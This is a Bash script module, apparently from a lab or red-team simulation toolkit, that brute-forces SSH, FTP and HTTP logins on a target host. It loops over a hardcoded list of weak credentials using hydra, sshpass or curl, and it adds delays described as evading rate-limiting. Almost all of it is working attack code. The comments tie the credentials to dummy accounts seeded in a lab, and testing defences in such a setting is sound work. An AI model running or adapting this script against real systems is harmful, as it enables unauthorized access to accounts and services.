#!/usr/bin/env bash
# Weak-credential brute force against SSH/FTP/HTTP. Uses hydra if
# available, else a hand-rolled loop over a built-in credential list
# matching the exact dummy credentials Phase 1 seeded.
# Adds realistic timing delays to simulate rate-limited brute force.
# Sourced, not executed - deliberately does not set shell options (see
# shared/config.sh for why).

BNB_BRUTEFORCE_CREDS=(
    "admin:admin123"
    "admin:admin"
    "root:toor"
    "admin:password"
    "admin:password123"
    "admin:123456"
    "root:root"
    "user:user"
    "guest:guest"
    "test:test"
    "admin:letmein"
    "root:admin"
    "svc-backup:B4ckup!2024"
    "svc-backup:backup123"
    "admin:admin2024"
)

_bruteforce_sleep() {
    echo "    [*] sleeping 1s to evade rate-limiting..."
    sleep 1
}

bruteforce_ssh() {
    target_ensure_set || { echo "[bruteforce-ssh] No target set."; return 1; }
    echo ""
    echo "=============================================="
    echo "  SSH BRUTE FORCE: ${TARGET_IP}:2222"
    echo "=============================================="
    echo ""
    local found="" cred user pass attempt=0 total="${#BNB_BRUTEFORCE_CREDS[@]}"
    if command -v hydra >/dev/null 2>&1; then
        echo "[*] Using hydra with ${total} credentials..."
        local userlist passlist
        userlist="$(mktemp)"; passlist="$(mktemp)"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f1 | sort -u > "$userlist"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f2 | sort -u > "$passlist"
        hydra -t 4 -L "$userlist" -P "$passlist" -s 2222 "${TARGET_IP}" ssh 2>&1
        if echo "${PIPESTATUS[0]}" | grep -q "^0$" 2>/dev/null; then
            found="hydra-detected"
        fi
        rm -f "$userlist" "$passlist"
    else
        echo "[*] hydra not found, using sshpass fallback (${total} attempts)..."
        echo ""
        if ! command -v sshpass >/dev/null 2>&1; then
            echo "[!] sshpass also not found - cannot attempt SSH login"
            results_record "bruteforce_ssh" "FAILED" "loud" "no hydra/sshpass available"
            return 1
        fi
        for cred in "${BNB_BRUTEFORCE_CREDS[@]}"; do
            user="${cred%%:*}"; pass="${cred##*:}"
            attempt=$((attempt + 1))
            echo "    [${attempt}/${total}] trying ${user}:${pass}..."
            if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p 2222 "${user}@${TARGET_IP}" true 2>/dev/null; then
                echo "[SUCCESS] ${user}:${pass} (attempt ${attempt}/${total})"
                found="${user}:${pass}"
                break
            else
                echo "[FAILED] ${user}:${pass}"
            fi
            _bruteforce_sleep
        done
    fi
    echo ""
    if [ -n "$found" ]; then
        echo "[RESULT] SSH credentials found!"
        results_record "bruteforce_ssh" "SUCCESS" "loud" "credentials found: ${found}"
    else
        echo "[RESULT] No SSH credentials found"
        results_record "bruteforce_ssh" "FAILED" "loud" "no working SSH credentials found"
    fi
}

bruteforce_ftp() {
    target_ensure_set || { echo "[bruteforce-ftp] No target set."; return 1; }
    echo ""
    echo "=============================================="
    echo "  FTP BRUTE FORCE: ${TARGET_IP}:2121"
    echo "=============================================="
    echo ""
    local found="" cred user pass attempt=0 total="${#BNB_BRUTEFORCE_CREDS[@]}"
    if command -v hydra >/dev/null 2>&1; then
        echo "[*] Using hydra with ${total} credentials..."
        local userlist passlist
        userlist="$(mktemp)"; passlist="$(mktemp)"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f1 | sort -u > "$userlist"
        printf '%s\n' "${BNB_BRUTEFORCE_CREDS[@]}" | cut -d: -f2 | sort -u > "$passlist"
        hydra -t 4 -L "$userlist" -P "$passlist" -s 2121 "${TARGET_IP}" ftp 2>&1
        if echo "${PIPESTATUS[0]}" | grep -q "^0$" 2>/dev/null; then
            found="hydra-detected"
        fi
        rm -f "$userlist" "$passlist"
    else
        echo "[*] hydra not found, using curl fallback (${total} attempts)..."
        echo ""
        for cred in "${BNB_BRUTEFORCE_CREDS[@]}"; do
            user="${cred%%:*}"; pass="${cred##*:}"
            attempt=$((attempt + 1))
            echo "    [${attempt}/${total}] trying ${user}:${pass}..."
            if curl -s --connect-timeout 3 "ftp://${user}:${pass}@${TARGET_IP}:2121/" -o /dev/null; then
                echo "[SUCCESS] ${user}:${pass} (attempt ${attempt}/${total})"
                found="${user}:${pass}"
                break
            else
                echo "[FAILED] ${user}:${pass}"
            fi
            _bruteforce_sleep
        done
    fi
    echo ""
    if [ -n "$found" ]; then
        echo "[RESULT] FTP credentials found!"
        results_record "bruteforce_ftp" "SUCCESS" "loud" "credentials found: ${found}"
    else
        echo "[RESULT] No FTP credentials found"
        results_record "bruteforce_ftp" "FAILED" "loud" "no working FTP credentials found"
    fi
}

bruteforce_http() {
    target_ensure_set || { echo "[bruteforce-http] No target set."; return 1; }
    echo ""
    echo "=============================================="
    echo "  HTTP LOGIN BRUTE FORCE: ${TARGET_IP}:${TARGET_PORT}/login"
    echo "=============================================="
    echo ""
    local found="" cred user pass code attempt=0 total="${#BNB_BRUTEFORCE_CREDS[@]}"
    for cred in "${BNB_BRUTEFORCE_CREDS[@]}"; do
        user="${cred%%:*}"; pass="${cred##*:}"
        attempt=$((attempt + 1))
        echo "    [${attempt}/${total}] trying ${user}:${pass}..."
        code="$(curl -s -o /dev/null -w '%{http_code}' -X POST "http://${TARGET_IP}:${TARGET_PORT}/login" -d "username=${user}&password=${pass}")"
        if [ "$code" = "200" ]; then
            echo "[SUCCESS] ${user}:${pass} (HTTP ${code}, attempt ${attempt}/${total})"
            found="${user}:${pass}"
            break
        else
            echo "[FAILED] ${user}:${pass} (HTTP ${code})"
        fi
        _bruteforce_sleep
    done
    echo ""
    if [ -n "$found" ]; then
        echo "[RESULT] HTTP credentials found!"
        results_record "bruteforce_http" "SUCCESS" "loud" "credentials found: ${found}"
    else
        echo "[RESULT] No HTTP credentials found"
        results_record "bruteforce_http" "FAILED" "loud" "no working HTTP credentials found"
    fi
}
